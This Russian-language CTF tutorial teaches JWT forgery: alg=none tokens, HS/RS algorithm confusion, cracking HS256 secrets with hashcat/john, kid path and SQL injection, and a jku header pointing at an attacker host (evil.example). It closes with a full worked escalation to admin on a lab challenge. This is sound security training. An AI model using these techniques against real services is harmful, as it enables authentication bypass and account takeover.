JWT (JSON Web Token) — стандарт токенов, состоящих из трёх base64url-частей: header, payload, signature. В CTF и bug bounty JWT — частый объект атак: можно поменять алгоритм, подделать подпись при слабом секрете или обмануть проверку через `kid`/`jku`. Этот урок — про структуру и практические подделки.

## Структура JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.<signature>
```

- **header**: `{"alg":"HS256","typ":"JWT"}`;
- **payload**: `{"user":"guest","exp":...}`;
- **signature**: `HMACSHA256(base64url(header)+"."+base64url(payload), secret)`.

Декодируем:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}
echo 'eyJ1c2VyIjoiZ3Vlc3QifQ' | base64 -d
# {"user":"guest"}
```

Инструмент `jwt_tool`:

```bash
python3 jwt_tool.py <token>
python3 jwt_tool.py <token> -T      # tamper
```

## alg=none

Если сервер принимает `"alg":"none"`, подпись не проверяется. Меняем header на `{"alg":"none"}` и убираем подпись (оставляем пустой последний сегмент):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

Некоторые серверы требуют `none`/`None`/`NONE` или пустую подпись — пробуйте варианты.

## Алгоритмная путаница (HS/RS)

Сервер ожидает RS256 (асимметричная подпись), но если реализация доверяет полю `alg`, можно переключить на HS256 и подписать **публичным ключом** как HMAC-секретом. Публичный ключ обычно доступен (`/.well-known/jwks.json`).

```bash
# берём публичный ключ и подписываем как HS256
python3 jwt_tool.py <token> -X k -pk public.pem
```

## Слабый секрет (HS256)

Если секрет слабый, его подбирают словарём:

```bash
hashcat -m 16500 token.txt rockyou.txt
john token.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

Затем подписываем свой payload:

```python
import jwt
token = jwt.encode({"user":"admin"}, secret, algorithm="HS256")
```

## kid-инъекции

Поле `kid` (key id) иногда используется как путь к файлу или SQL-запрос:

```json
{"alg":"HS256","kid":"../../dev/null"}
```

- `kid` = путь к файлу → подписываем ключом из известного файла (например, `/dev/null` = пустой ключ);
- `kid` = SQL → инъекция в запрос ключа;
- `kid` = `/proc/self/environ` → ключ из переменных окружения.

## jku / x5u / jwk

Поля `jku`, `x5u`, `jwk` указывают, откуда взять ключ. Если сервер доверяет им без allowlist — подсовываем свой JWKS:

```json
{"alg":"RS256","jku":"https://evil.example/jwks.json"}
```

Сервер скачает наш ключ и проверит подпись — обход.

## Разобранный пример

Дано: cookie `token=eyJ...` с `{"user":"guest"}`. Цель — стать admin.

1. Декодируем, видим HS256.
2. Пробуем alg=none:

```bash
python3 jwt_tool.py <token> -X a
# генерирует токен с alg=none
```

Если сервер отверг — подбираем секрет:

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
# <hash>:secret123
```

3. Подписываем admin:

```python
import jwt
print(jwt.encode({"user":"admin"}, "secret123", algorithm="HS256"))
```

4. Подставляем cookie, получаем доступ.

## Частые ошибки и подводные камни

- Забывать про base64url (без padding, `-`/`_`) при ручном кодировании.
- Пробовать `alg:none` без учёта регистра (`none`/`None`/`NONE`).
- Не проверять `kid`/`jku` — часто именно там дыра.
- Считать, что секрет неподбираем — rockyou часто решает.
- Игнорировать `exp`/`nbf` — истёкший токен не примут.
- Путать подпись (signature) и шифрование (JWE) — JWT обычно подписан, а не зашифрован.

## Дополнительная теория: claim'ы и время

JWT-полезная нагрузка — это набор **claims**. Стандартные (`registered`) claims имеют особую семантику, и именно их чаще всего проверяют неправильно. `iss` (issuer) указывает, кто выпустил токен; если сервер не сверяет его со списком доверенных издателей, токен от чужого сервиса будет принят. `aud` (audience) определяет получателя; отсутствие проверки `aud` — классическая дыра в микросервисах, где токен одного сервиса принимают другие. `exp` (expiration) и `nbf` (not before) ограничивают время жизни; если сервер игнорирует `exp`, украденный токен работает вечно. `iat` (issued at) и `jti` (JWT ID) нужны для отзыва и дедупликации.

Отдельно стоит `sub` (subject) — обычно идентификатор пользователя. Подмена `sub` при слабой подписи — прямой путь к горизонтальной эскалации: вместо `sub=user1` подставляем `sub=admin`. Публичные (custom) claims вроде `role`, `is_admin`, `scope` приложения читают напрямую, поэтому их изменение так ценно для атакующего. Хорошая практика — держать в токене минимум данных и проверять все критичные claims на сервере, а не доверять содержимому.

## Отзыв токенов и blacklist

JWT по своей природе **stateless**: сервер не хранит сессию, а доверяет подписи. Это плюс для масштабирования и минус для безопасности — токен нельзя «отозвать» до истечения `exp`. Отсюда практики: короткое время жизни access-токена плюс refresh-токен; чёрный список `jti`; версия ключа/секрета. В CTF встречается задача «токен украден, но истёк — что делать»: иногда `exp` проверяется нестрого (например, сравнивается как строка, а не как число), и подмена `exp` на `"9"` (строка больше числа при сравнении) проходит. Это разновидность type-confusion в проверке claim.

## Разбор ошибок и отладка

Когда подделанный токен «не принимается», действуйте по шагам. Во-первых, убедитесь, что base64url-кодирование корректно: padding не нужен, но символы `+`/`/` должны быть заменены на `-`/`_`, иначе подпись не совпадёт. Во-вторых, проверьте, не добавляет ли сервер пробелов/переносов. В-третьих, декодируйте ответ сервера — часто он возвращает конкретную ошибку (`invalid signature`, `token expired`, `alg not allowed`), которая прямо указывает, что проверяется. Если ошибка — `invalid signature`, значит подпись проверяется и нужно либо угадать секрет, либо переключить алгоритм. Если `alg not allowed`, значит `none` заблокирован, и стоит смотреть `kid`/`jku`. Ведите журнал попыток: каждая ошибка сужает пространство.

## Сравнение с альтернативами

JWT — не единственный формат токенов. **Opaque-токены** (случайная строка) хранятся на сервере и не несут данных: их нельзя подделать без доступа к хранилищу, но они требуют состояния. **PASETO** и **Branca** — современные альтернативы, устраняющие часть проблем JWT (например, алгоритм фиксирован, что убирает alg confusion). **macaroons** и **biscuits** позволяют делегировать права с ограничениями. Понимание альтернатив важно: когда видите JWT, спросите себя, почему выбран именно он и какие его слабости могли не закрыть. В задачах часто «JWT-подобный» формат оказывается самодельным — тогда смотрите на его собственные quirks.

## Частые вопросы

**Почему мой alg=none токен не принимается?** Современные библиотеки по умолчанию отклоняют `none`. Но иногда достаточно вариантов: `none` в другом регистре (`None`, `NONE`), пустая подпись с точкой на конце, или `alg` со значением `null`. Также проверьте, не требует ли сервер определённый `typ`. Если ничего не проходит — вектор закрыт, переходите к `kid`/`jku`/подбору секрета.

**Как быстро найти секрет HS256?** Сначала попробуйте очевидные строки (`secret`, `password`, имя приложения, пустая строка). Затем `hashcat -m 16500` с rockyou. Если не нашлось — секрет длинный/случайный, и подбор бессмыслен; ищите утечку секрета в исходниках, `.env`, GitHub, конфигах.

**Можно ли подделать RS256 без приватного ключа?** Напрямую — нет. Но если реализация доверяет `alg`, переключите на HS256 и подпишите публичным ключом (alg confusion). Публичный ключ обычно доступен в `/.well-known/jwks.json` или в сертификате. Это классическая уязвимость.

**Что если сервер проверяет подпись, но не проверяет claims?** Тогда можно оставить валидную подпись (от своего токена) и... нет, claims защищены подписью. Но если подпись проверяется слабо (например, только первые байты), или если `aud`/`iss` не проверяются, вы можете использовать токен, выпущенный для другого сервиса, — это confused-deputy-подобная атака.

## Практический разбор: полный цикл подделки

Дано: cookie `auth=eyJ...`, задача — стать admin. Цикл:

```bash
# 1. декодируем
python3 jwt_tool.py <token>
# [*] alg: HS256  payload: {"user":"guest","role":"user"}

# 2. пробуем alg=none
python3 jwt_tool.py <token> -X a
# → cookie: eyJhbGciOiJub25lIn0.<payload>.

# 3. если не сработало — подбор секрета
echo <token> > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt --quiet
# <hash>:secret123

# 4. подписываем admin
python3 -c "import jwt;print(jwt.encode({'user':'admin','role':'admin'},'secret123',algorithm='HS256'))"
```

Подставляем cookie в браузер/curl:

```bash
curl -s -H 'Cookie: auth=<newtoken>' http://chal.local/admin
# flag{jwt_pwned}
```

Если секрет не подобрался — пробуйте `kid`-инъекцию (`{"alg":"HS256","kid":"/dev/null"}` и подпись пустым ключом) или `jku` (свой JWKS). Помните про base64url: при ручной сборке токена не добавляйте padding и используйте `-`/`_`. Всегда проверяйте `exp` — истёкший токен не примут.
